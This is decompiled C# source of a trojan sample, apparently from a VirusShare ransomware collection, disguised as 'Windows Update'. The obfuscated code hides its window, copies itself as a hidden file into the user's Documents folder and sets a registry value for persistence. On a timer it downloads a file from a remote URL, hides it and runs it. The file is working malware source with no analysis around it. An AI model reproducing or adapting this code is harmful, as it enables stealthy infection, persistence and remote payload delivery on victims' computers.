// Decompiled with JetBrains decompiler
// Type: windows_update.ijl5402
// Assembly: Windows Update, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AD392BA1-9C14-4DFE-974F-DF263E483990
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Trojan-Ransom.Win32.Gimemo.wxj-0ca921544c9054361bc16e568e27aab3c46187149d7919afc9cfc91c5f59efb7.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace windows_update
{
  [DesignerGenerated]
  public class ijl5402 : Form
  {
    private IContainer \u0002;
    [AccessedThroughProperty("es24d0fe")]
    private System.Windows.Forms.Timer \u0003;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer \u0005;
    private string \u0008;
    private int \u0006;
    private string \u000E;
    private int \u000F;

    public ijl5402()
    {
      this.Load += new EventHandler(this.\u0002);
      this.\u0008 = \u0002\u2000.\u0002(-1240717737);
      this.\u0006 = 60000;
      this.\u000F = 0;
      this.\u0002();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.\u0002 == null)
          return;
        this.\u0002.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \u0002()
    {
      this.\u0002 = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (ijl5402));
      this.\u0033u8uwjfsnhdjx6s56g6tww56ecamf5vf\u2009\u2002\u200A\u0002(new System.Windows.Forms.Timer(this.\u0002));
      this.\u0033u8uwjfsnhdjx6s56g6tww56ecamf5vf\u2009\u2002\u200A\u0003(new System.Windows.Forms.Timer(this.\u0002));
      this.SuspendLayout();
      this.\u0033u8uwjfsnhdjx6s56g6tww56ecamf5vf\u2009\u2002\u200A\u0002().Interval = 20000;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject(\u0002\u2000.\u0002(-1240717823));
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = \u0002\u2000.\u0002(-1240717808);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = \u0002\u2000.\u0002(-1240717598);
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
    }

    internal virtual System.Windows.Forms.Timer \u0033u8uwjfsnhdjx6s56g6tww56ecamf5vf\u2009\u2002\u200A\u0002() => this.\u0003;

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0033u8uwjfsnhdjx6s56g6tww56ecamf5vf\u2009\u2002\u200A\u0002(
      System.Windows.Forms.Timer _param1)
    {
      EventHandler eventHandler = new EventHandler(this.\u0003);
      if (this.\u0003 != null)
        this.\u0003.Tick -= eventHandler;
      this.\u0003 = _param1;
      if (this.\u0003 == null)
        return;
      this.\u0003.Tick += eventHandler;
    }

    internal virtual System.Windows.Forms.Timer \u0033u8uwjfsnhdjx6s56g6tww56ecamf5vf\u2009\u2002\u200A\u0003() => this.\u0005;

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0033u8uwjfsnhdjx6s56g6tww56ecamf5vf\u2009\u2002\u200A\u0003(
      System.Windows.Forms.Timer _param1)
    {
      EventHandler eventHandler = new EventHandler(this.\u0005);
      if (this.\u0005 != null)
        this.\u0005.Tick -= eventHandler;
      this.\u0005 = _param1;
      if (this.\u0005 == null)
        return;
      this.\u0005.Tick += eventHandler;
    }

    public static void ergsx(string Name, string Path) => Registry.CurrentUser.OpenSubKey(\u0002\u2000.\u0002(-1240717620), true).SetValue(Name, (object) Path, RegistryValueKind.String);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void \u0002(object _param1, EventArgs _param2)
    {
label_0:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        this.Hide();
label_1:
        num3 = 2;
        this.\u0033u8uwjfsnhdjx6s56g6tww56ecamf5vf\u2009\u2002\u200A\u0002().Interval = this.\u0006;
label_2:
        ProjectData.ClearProjectError();
        num1 = 1;
label_3:
        num3 = 4;
        if (Operators.CompareString(Process.GetCurrentProcess().MainModule.FileName, \u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717640), false) != 0)
          goto label_7;
label_4:
        num3 = 5;
        ijl5402.ergsx(this.Text, Application.ExecutablePath);
label_5:
        num3 = 6;
        this.\u0033u8uwjfsnhdjx6s56g6tww56ecamf5vf\u2009\u2002\u200A\u0003().Start();
label_6:
        num3 = 7;
        this.\u0033u8uwjfsnhdjx6s56g6tww56ecamf5vf\u2009\u2002\u200A\u0002().Start();
        goto label_11;
label_7:
        num3 = 9;
label_8:
        num3 = 10;
        FileSystem.FileCopy(Process.GetCurrentProcess().MainModule.FileName, \u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717640));
label_9:
        num3 = 11;
        Process.Start(\u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717640));
label_10:
        num3 = 12;
        System.IO.File.SetAttributes(\u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717640), FileAttributes.Hidden);
        ProjectData.EndApp();
label_11:
        num3 = 15;
        \u0008.\u0002(true);
label_12:
        ProjectData.ClearProjectError();
        goto label_19;
label_14:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
              case 13:
              case 14:
              case 15:
                goto label_11;
              case 9:
                goto label_7;
              case 10:
                goto label_8;
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 16:
                goto label_12;
              case 17:
                goto label_19;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_14;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_19:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void \u0003(object _param1, EventArgs _param2)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        if (Operators.CompareString(this.\u000E, \u000F.\u0002().url, false) == 0)
          goto label_18;
label_2:
        num3 = 3;
        \u000F.\u0002().url = this.\u000E;
label_3:
        num3 = 4;
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(this.\u0008);
label_4:
        num3 = 5;
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
label_5:
        num3 = 6;
        StreamReader streamReader = new StreamReader(response.GetResponseStream());
label_6:
        num3 = 7;
        this.\u000E = streamReader.ReadLine();
label_7:
        num3 = 8;
        if (!\u0005.\u0002().FileSystem.FileExists(\u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717667)))
          goto label_13;
label_8:
        num3 = 9;
        \u0005.\u0002().FileSystem.DeleteFile(\u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717667));
label_9:
        num3 = 10;
        \u0005.\u0002().Network.DownloadFile(this.\u000E, \u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717667));
label_10:
        num3 = 11;
        System.IO.File.SetAttributes(\u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717667), FileAttributes.Hidden);
label_11:
        num3 = 12;
        \u000F.\u0002().Save();
label_12:
        num3 = 13;
        Process.Start(\u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717667), Conversions.ToString(true));
        goto label_18;
label_13:
        num3 = 15;
label_14:
        num3 = 16;
        \u0005.\u0002().Network.DownloadFile(this.\u000E, \u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717667));
label_15:
        num3 = 17;
        System.IO.File.SetAttributes(\u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717667), FileAttributes.Hidden);
label_16:
        num3 = 18;
        \u000F.\u0002().Save();
label_17:
        num3 = 19;
        Process.Start(\u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717667), Conversions.ToString(true));
label_18:
        ProjectData.ClearProjectError();
        goto label_25;
label_20:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
              case 20:
              case 21:
              case 22:
                goto label_18;
              case 15:
                goto label_13;
              case 16:
                goto label_14;
              case 17:
                goto label_15;
              case 18:
                goto label_16;
              case 19:
                goto label_17;
              case 23:
                goto label_25;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_20;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_25:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void \u0005(object _param1, EventArgs _param2)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        System.IO.File.SetAttributes(\u0005.\u0002().FileSystem.SpecialDirectories.MyDocuments + \u0002\u2000.\u0002(-1240717640), FileAttributes.Hidden);
label_2:
        num3 = 3;
        ijl5402.ergsx(this.Text, Application.ExecutablePath);
label_3:
        num3 = 4;
        \u0008.\u0002(true);
label_4:
        ProjectData.ClearProjectError();
        goto label_11;
label_6:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }
  }
}
